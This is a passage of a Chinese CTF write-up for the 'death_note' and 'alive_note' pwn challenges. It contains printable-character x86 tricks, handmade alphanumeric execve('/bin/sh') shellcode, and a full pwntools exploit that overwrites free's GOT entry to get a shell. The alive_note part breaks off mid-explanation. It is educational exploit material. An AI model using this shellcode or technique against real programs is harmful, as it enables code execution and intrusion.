    xor byte ptr [eax… + 立即数], al dl…
    xor byte ptr [eax… + 立即数], ah dh…
    xor dword ptr [eax… + 立即数], esi edi
    xor word ptr [eax… + 立即数], si di
    xor al dl…, byte ptr [eax… + 立即数]
    xor ah dh…, byte ptr [eax… + 立即数]
    xor esi edi, dword ptr [eax… + 立即数]
    xor si di, word ptr [eax… + 立即数]
    4.比较指令:
    cmp al, 立即数
    cmp byte ptr [eax… + 立即数], al dl…
    cmp byte ptr [eax… + 立即数], ah dh…
    cmp dword ptr [eax… + 立即数], esi edi
    cmp word ptr [eax… + 立即数], si di
    cmp al dl…, byte ptr [eax… + 立即数]
    cmp ah dh…, byte ptr [eax… + 立即数]
    cmp esi edi, dword ptr [eax… + 立即数]
    cmp si di, word ptr [eax… + 立即数]
    5.转移指令:
    push 56h
    pop eax
    cmp al, 43h
    jnz lable
     jmp lable
    6.交换al, ah
    push eax
    xor ah, byte ptr [esp] // ah ^= al
    xor byte ptr [esp], ah // al ^= ah
    xor ah, byte ptr [esp] // ah ^= al
    pop eax
    7.清零:
    push 44h
    pop eax
    sub al, 44h ; eax = 0
    push esi
    push esp
    pop eax
    xor [eax], esi ; esi = 0
#### 构造shellcode思路
首先得明白我们应该要什么样的结果
    eax=0xb
    ecx=0
    ebx= /bin/sh地址
    edx = 0
然后开始构造
  1. 先用shellcraft.sh()生成shellcode，发觉还是有可取之处，我们将push /bin/sh部分取出来就好了
    >>> asm(shellcraft.sh())
    'jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80'
    push 0x68
        push 0x732f2f2f
        push 0x6e69622f
        mov ebx, esp
然后修改代码，mov ebx,esp改成push esp, pop ebx
    push 0x68 #push /bin/sh
        push 0x732f2f2f
        push 0x6e69622f
        push esp
        pop ebx
  1. 我free的时候会传进来heap地址，所以我们初始地址存在了eax里，记得保存，还有传进来同时ecx=0xa,edx=0,这些都是可以利用的，构造eax=0xb
    push ecx
        pop eax
        xor al,0x41
        xor al,0x40
同时，这段代码可以作为滑板，一直执行
  1. 构造ecx=0
    push edx
        pop ecx
  1. 最主要要构造int 0x80，先将前面的shellcode拼接起来，具体怎么个顺序可以自行调整，不过要清楚寄存器没有被破坏
我构造了这样的顺序
    push ecx
        pop eax
        xor al,0x41
        xor al,0x40
        push edx
        pop ecx
        push 0x68 #push /bin/sh
        push 0x732f2f2f
        push 0x6e69622f
        push esp
        pop ebx
最前面来构造int 0x80,因为此时堆块地址还未被破坏，
    push eax #堆块地址
        pop ebx #保存堆块地址到ebx
        push edx
        pop eax
        dec eax #构造0xff
        xor al,0x46 #al = 0xb9
        xor byte ptr[ebx+0x35],al #set int 0x80
        xor byte ptr[ebx+0x36],al
这里要注意的是ebx+0x35这是我自行构造出来的，通过这一段当作滑板，构造出可见字符常数
    push ecx
        pop eax
        xor al,0x41
        xor al,0x40
所以最后就是
    push eax #堆块地址
        pop ebx #保存堆块地址到ebx
        push edx
        pop eax
        dec eax #构造0xff
        xor al,0x46 #al = 0xb9
        xor byte ptr[ebx+0x35],al #set int 0x80
        xor byte ptr[ebx+0x36],al
        push ecx
        pop eax
        xor al,0x41
        xor al,0x40
        push ecx
        pop eax
        xor al,0x41
        xor al,0x40
        push ecx
        pop eax
        xor al,0x41
        xor al,0x40
        push ecx
        pop eax
        xor al,0x41
        xor al,0x40
        push edx
        pop ecx
        push 0x68 #push /bin/sh
        push 0x732f2f2f
        push 0x6e69622f
        push esp
        pop ebx
最后加上'\x74\x39'这个，拿来构造int 0x80的，就好了
#### exp
    #!/usr/bin/env python2
    # -*- coding: utf-8 -*-    from pwn import *
    local = 1
    host = '127.0.0.1' 
    port = 10000
    context.log_level = 'debug'
    exe = './death_note'
    # Load it if has exe
    try:
        context.binary = exe
        elf = ELF(exe)
    except Exception as e:
        print("Elf can't be load")
    # load libc 
    libc = elf.libc if context.binary else ELF("./libc.so.6")
    if local:
        io = process(exe)
    else:
        io = remote(host,port, timeout=10)
    #don't forget to change it
    s    = lambda data                                    : io.send(str(data))
    sa   = lambda delim,data                              : io.sendafter(str(delim), str(data))
    sl   = lambda data                                    : io.sendline(str(data))
    sla  = lambda delim,data                              : io.sendlineafter(str(delim), str(data))
    r    = lambda numb=4096                               : io.recv(numb)
    rl   = lambda                                         : io.recvline()
    ru   = lambda delim,drop=True                         : io.recvuntil(delim, drop)
    rg   = lambda regex                                   : io.recvregex(regex)
    rp   = lambda timeout=1                               : io.recvrepeat(timeout)
    uu32 = lambda data                                    : u32(data.ljust(4, '\x00'))
    uu64 = lambda data                                    : u64(data.ljust(8, '\x00'))
    lg   = lambda s,addr                                  : io.success('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))
    ga   = lambda job=""                                  : gdb.attach(io, job) if local else 0
    ia   = lambda                                         : io.interactive()
    # break on aim addr
    def debug(addr,PIE=True):
        if PIE:
            text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(io.pid)).readlines()[1], 16)
            ga('b *{}'.format(hex(text_base+addr)))
        else:
            ga("b *{}".format(hex(addr)))
    # get_one_gadget
    def get_one_gadget(filename):
        return map(int, os.popen("one_gadget --raw " + filename).readlines()[0].split(' '))
    #===========================================================
    #                    EXPLOIT GOES HERE
    #===========================================================
        # Arch:     i386-32-little
        # RELRO:    Partial RELRO
        # Stack:    Canary found
        # NX:       NX disabled
        # PIE:      No PIE (0x8048000)
        # RWX:      Has RWX segments
    def c(idx):
        sla(":", idx)
    def new(idx, content):
        c(1)
        sla(":", idx)
        sla(":", content)
    def delete(idx):
        c(3)
        sla(":", idx)
    def exp(host, rce=False):
        if rce:
            one_gadget = get_one_gadget(libc.path)
        #start here
        offset = (elf.got['free']-0x0804A060)/4
        #ga("b *0x8048865\nc\nn 4\ns")
        shellcode = asm('''
                        push eax
                        pop ebx #保存指针
                        push edx
                        pop eax
                        dec eax
                        xor al,0x46
                        xor byte ptr[ebx+0x35],al #set int 0x80
                        xor byte ptr[ebx+0x36],al
                        push ecx #这里作为滑板，填充数据
                        pop eax
                        xor al, 0x41
                        xor al, 0x40
                        push ecx
                        pop eax
                        xor al, 0x41
                        xor al, 0x40
                        push ecx
                        pop eax
                        xor al, 0x41
                        xor al, 0x40
                        push ecx # set al=0xb
                        pop eax
                        xor al, 0x41
                        xor al, 0x40
                        push edx  # set ecx=0
                        pop ecx
                        push 0x68 # push /bin/sh
                        push 0x732f2f2f
                        push 0x6e69622f
                        push esp
                        pop ebx
                        ''') 
        lg("len", len(shellcode))
        shellcode += '\x74\x39'
        new(offset, shellcode)
        delete(offset)
        ia()
    if __name__ == '__main__':
        exp(host,)
### alive_note
#### 漏洞利用
自己利用还是不会，我感觉这题比那个note-service2难多了，讲真，这题考的纯字母数字shellcode在加上shellcode链构造，这是目前我遇到的最难的shellcode题目了
照着shellcode分析一遍，将过程梳理下
整体思路是通过构造shellcode链， 然后read(0,heap,size),读入shellcode执行， 这样就可以有非限制字符了
  1. 确认需要读取的heap,我们可以将heap设置为我们已执行过的shellcode链的堆块，也就是说执行前的堆块都行，我们就用第1个堆块
  2. 我们要执行int 80软中断，read是eax=3,ebx=0,ecx=heap,edx=size
  3. 首先我们可以获得的是ecx，因为free调用的时候会传入heap地址，所以第一步设置ecx,这里经过测试发觉free的堆块地址会放到eax里，同时还有空闲字节设置edx=size
    push eax 
    pop ecx 